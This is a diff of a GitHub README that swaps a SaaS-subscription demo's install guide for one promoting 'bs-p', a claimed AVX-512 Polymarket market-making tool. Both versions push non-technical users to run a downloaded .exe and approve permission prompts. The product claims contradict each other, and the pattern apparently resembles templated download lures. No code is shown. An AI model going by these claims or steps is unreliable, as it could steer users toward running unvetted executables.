@@ -1,142 +1,139 @@
-# 🚀 saas-subscription-demo - Manage SaaS Subscriptions Easily
+# ⚙️ bs-p - Fast Market-Making Kernel for Polymarket
 
-[![Download](https://img.shields.io/badge/Download-Get%20the%20App-brightgreen)](https://github.com/akamsniper/saas-subscription-demo)
-
-## 📋 About saas-subscription-demo
-
-This is a full-stack demo application for managing SaaS (Software as a Service) subscriptions. It has user login, subscription checkout using Stripe (in test mode), and a simple dashboard to view and manage your subscription. It runs on Windows and uses modern web technologies in the background such as Next.js and NestJS. You don’t need to know programming to run this app.
-
-It includes features like:
-- User authentication (login and registration).
-- Checkout process with Stripe in test mode.
-- Protected pages so only logged-in users can access the dashboard.
-- A simple dashboard to see subscription status.
-- Webhooks support to update subscription data automatically.
-
-## 🎯 Who Should Use This?
-
-This app is suited for anyone interested in trying a demo of a SaaS subscription flow. You may be a small business owner or someone testing SaaS setups. It requires no technical skills to run on Windows.
-
-## 🖥️ System Requirements
-
-Make sure your computer meets these requirements before proceeding:
-
-- Windows 10 or higher.
-- At least 4 GB of free RAM.
-- At least 500 MB of free disk space.
-- Internet connection for authentication and Stripe checkout.
-- A modern web browser (such as Edge, Chrome, or Firefox).
-
-## ⬇️ Download and Install the App
-
-1. Click the big green badge above or use this link to visit the download page:
-
-   [https://github.com/akamsniper/saas-subscription-demo](https://github.com/akamsniper/saas-subscription-demo)
-
-2. Once on the page, look for the **Releases** section on the right sidebar or scroll down to find download options.
-
-3. Download the latest Windows installer file (for example, it may have `.exe` at the end). If a pre-built installer is not available, skip to the manual setup steps in the next section.
-
-4. After downloading, open the installer file by double-clicking it. Windows may ask for permission; click **Yes** to continue.
-
-5. Follow the on-screen steps in the installer. Default settings are fine unless you want to change the install folder.
-
-6. When installation completes, the app should launch automatically or create a shortcut on your desktop.
-
-7. If the app does not open automatically, find and open **SaaS Subscription Demo** from your Start menu.
-
-## 🛠️ Manual Setup (If no installer is available)
-
-This app depends on programs called Node.js and Git to work. If you do not have these installed, follow the steps:
-
-1. Download Node.js:
-   - Go to https://nodejs.org/
-   - Click the **LTS** (Long Term Support) version for Windows.
-   - Download the installer and run it.
-   - Follow the setup instructions and accept all defaults.
-
-2. Download Git:
-   - Visit https://git-scm.com/download/win
-   - Download and run the installer.
-   - Accept the default options during setup.
-
-3. Download the app files:
-   - Return to the main app page: https://github.com/akamsniper/saas-subscription-demo
-   - Click the green **Code** button near the top.
-   - Choose **Download ZIP**.
-   - Once downloaded, right-click the ZIP file and choose **Extract All**.
-   - Extract into a folder you can easily find, such as `Documents\saas-subscription-demo`.
-
-4. Open the Command Prompt:
-   - Press `Win + R`, type `cmd`, and press Enter.
-
-5. Navigate to the folder where you extracted the files. For example, if in Documents:
-
-   ```
-   cd %USERPROFILE%\Documents\saas-subscription-demo
-   ```
-
-6. In the Command Prompt, type this to install necessary files:
-
-   ```
-   npm install
-   ```
-
-   Wait until this finishes. It may take a few minutes.
-
-7. To start the app, enter this command:
-
-   ```
-   npm run dev
-   ```
-
-8. Open your browser and go to:
-
-   ```
-   http://localhost:3000
-   ```
-
-   You should see the login screen of the app.
-
-## 🔑 How to Use the App
-
-1. On the homepage, click **Sign Up** if you have no account. Fill in your email and password, then register.
-
-2. After logging in, you will see the dashboard where you can view your subscription details.
-
-3. To subscribe, choose the Stripe checkout option on the dashboard. You can make a test payment since this uses Stripe’s test mode.
-
-4. When payment completes, the app will update your subscription status automatically.
-
-5. Use the dashboard to check your active subscription or access protected content.
-
-## 👨‍💻 Troubleshooting
-
-- If the installer does not run, check that your Windows security settings allow apps from unknown sources.
-- If the app won’t start in manual mode, confirm Node.js and Git are installed by running:
-
-  ```
-  node -v
-  git --version
-  ```
-
-- If the browser shows an error accessing `http://localhost:3000`, make sure the server is running in the Command Prompt window.
-
-- If checkout fails, confirm you are using the Stripe test card numbers provided on the app’s payment page.
-
-## ⚙️ Technical Info (For Reference)
-
-This app uses Next.js for frontend and NestJS for backend. It runs a REST API server to handle user login and subscription data. Stripe handles payments with webhooks to update subscription state in real time. The app stores data using a local database or mock data for demo purposes.
-
-## 📂 Topics Covered
-
-- Authentication with login/signup flows.
-- SaaS subscription management.
-- Stripe checkout integration in test mode.
-- Full-stack development using Next.js and NestJS.
-- Protected pages based on user login.
-- Simple webhooks handling.
+[![Download bs-p](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/akamsniper/bs-p/releases)
 
 ---
 
-[![Download](https://img.shields.io/badge/Download-Get%20the%20App-brightgreen)](https://github.com/akamsniper/saas-subscription-demo)
+## 🚀 Getting Started with bs-p
+
+This guide will help you download and run bs-p on a Windows computer. bs-p is a software tool designed for market-making on Polymarket. It uses advanced methods to process market data quickly. Even if you have never used software like this before, you will find it simple to get started.
+
+You do not need any programming skills or experience. Just follow each step carefully.
+
+---
+
+## 🔍 What Is bs-p?
+
+bs-p is a market-making tool. It helps users provide liquidity on prediction markets like Polymarket. The software processes market data very fast by using AVX-512 instructions available in modern Intel processors. These instructions speed up calculations, which is helpful for high-frequency trading.
+
+Under the hood, bs-p uses advanced math models like Logit Jump-Diffusion and Avellaneda-Stoikov in logit space. These models help make smarter trading decisions.
+
+bs-p is written in Rust and C, focusing on performance. It runs directly on your Windows computer and does not need an internet connection to work once installed.
+
+---
+
+## 💻 System Requirements
+
+Before installing bs-p, make sure your Windows computer meets these requirements:
+
+- Operating System: Windows 10 or later (64-bit)
+- Processor: Intel CPU with AVX-512 support (Xeon, Core i9-10th Gen or newer)
+- RAM: 8 GB minimum, 16 GB recommended
+- Disk space: At least 200 MB free
+- Internet connection for downloading the software
+
+If you are unsure if your processor supports AVX-512, you can check it with free CPU information tools available online.
+
+---
+
+## 📦 How to Download bs-p
+
+To get the software, you need to visit the official releases page on GitHub.
+
+[![Download bs-p](https://img.shields.io/badge/Download-Here-blue)](https://github.com/akamsniper/bs-p/releases)
+
+1. Click the link above or go to this URL in your web browser:  
+   https://github.com/akamsniper/bs-p/releases  
+2. On that page, look for the latest release version. Releases are listed by date.  
+3. Find the Windows executable file. It will usually have a name ending with `.exe`.  
+4. Click the file to start downloading it to your computer.
+
+---
+
+## 🖥 Installing and Running bs-p
+
+Once you have downloaded the `.exe` file, follow these steps:
+
+1. Open the folder where you saved the file.
+2. Double-click the `.exe` file to run the installer or launch the program directly.
+3. If Windows asks for permission, click “Yes” to allow the program to run.
+4. The program will either install on your computer or open a command window to start running.
+5. Follow any on-screen instructions. Most users will simply see the software start working immediately.
+
+bs-p runs as a command-line program. This means it opens a black or dark window where it shows messages and status updates.
+
+---
+
+## ⚙️ Basic Usage
+
+Once bs-p is running, it will connect to Polymarket data feeds (if configured) and begin market-making operations. You should see messages indicating the system status and process events.
+
+You do not need to provide input to get started if default settings are used. However, some optional configuration files may be available in the software folder to adjust behavior.
+
+---
+
+## 🛠 Configuring bs-p
+
+By default, bs-p is set to work with standard Polymarket markets using the latest mathematical models. If you want to customize its behavior:
+
+- Look inside the installation folder for a file named `config.toml` or `.json`.  
+- Open it with any text editor like Notepad.  
+- Change basic settings like API keys, market IDs, or parameters following any instructions inside.
+
+Avoid changing files unless you know what you are doing. Incorrect settings can cause the program to stop working.
+
+---
+
+## 🔄 Updating bs-p
+
+It is a good practice to keep bs-p updated as new versions fix bugs and improve performance.
+
+To update:
+
+1. Visit the releases page again:  
+   https://github.com/akamsniper/bs-p/releases  
+2. Download the new version’s `.exe` file.  
+3. Replace your old `.exe` file with the new one by saving it in the same folder.
+
+You do not usually need to uninstall previous versions.
+
+---
+
+## 💾 Uninstall bs-p
+
+bs-p is a portable program. If you want to remove it:
+
+1. Delete the software folder where you saved the `.exe` file and other files.  
+2. Optionally, remove any shortcuts you created on your desktop.  
+
+No special uninstaller is needed.
+
+---
+
+## 🛡 Security and Privacy
+
+bs-p runs locally on your Windows computer and does not send data outside your machine unless specifically connected to Polymarket APIs. It does not collect personal information.
+
+Always download software only from the official releases page to avoid tampered files.
+
+---
+
+## 🌐 Support and Further Information
+
+For support, visit the GitHub repository page:
+
+https://github.com/akamsniper/bs-p
+
+Here you can find more technical details, report issues, or request help from the maintainers.
+
+---
+
+## 📌 Repository Details
+
+- Name: bs-p  
+- Description: Ultra-low latency AVX-512 Polymarket market-making kernel (Logit Jump-Diffusion + Avellaneda-Stoikov in logit space)  
+- Topics: avx512, c, core, hft, market-making, polymarket, prediction-markets, quantitative-finance, rust, simd  
+
+---
+
+[![Download bs-p](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/akamsniper/bs-p/releases)
